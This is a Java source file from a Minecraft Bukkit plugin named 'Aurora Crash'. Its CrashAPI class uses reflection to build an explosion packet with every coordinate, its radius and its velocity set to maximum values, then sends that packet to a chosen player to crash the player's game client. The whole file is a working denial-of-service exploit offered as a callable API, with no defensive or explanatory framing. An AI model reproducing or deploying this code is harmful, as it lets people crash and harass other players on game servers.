package io.github.dennermelo.acrash;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Collections;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;


public class CrashAPI {
	
	private static Object packet;
	
	public static void crashPlayer(Player player) {
		try {
		    ReflectionUtils.sendPacket(player, packet);
		} catch (SecurityException | IllegalArgumentException | NullPointerException e) {
			Bukkit.getConsoleSender().sendMessage("�c[Aurora Crash] N�o foi possivel crashar o jogador " + player.getName()+".");
		}
	}
	
	static void load() {
		try
		{
			Object Vec3D;
			Class<?> explosionClass;
			Class<?> vectorClass = ReflectionUtils.getNMSClass("Vec3D");
			
			if (Main.getVersion() == Version.v1_5 || Main.getVersion() == Version.v1_6) {
				explosionClass = ReflectionUtils.getNMSClass("Packet60Explosion");
			} else {
				explosionClass = ReflectionUtils.getNMSClass("PacketPlayOutExplosion");
			}
			
			if (Main.getVersion() == Version.v1_5 || Main.getVersion() == Version.v1_6 || Main.getVersion() == Version.v1_7) {
			    Method Vector3dConstructor = vectorClass.getMethod("a", double.class, double.class, double.class);
				Vec3D = Vector3dConstructor.invoke(null, Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
			} else {
			    Constructor<?> Vector3dConstructor = vectorClass.getConstructor(double.class, double.class, double.class);
			    Vec3D = Vector3dConstructor.newInstance(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
			}
			
			Constructor<?> explosionConstructor = explosionClass.getConstructor(double.class, double.class, double.class, float.class, List.class, vectorClass);
			packet = explosionConstructor.newInstance(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), Vec3D);
		} 
		catch (SecurityException | IllegalArgumentException | NoSuchMethodException | IllegalAccessException | InvocationTargetException | InstantiationException | NullPointerException e) {}
	}
}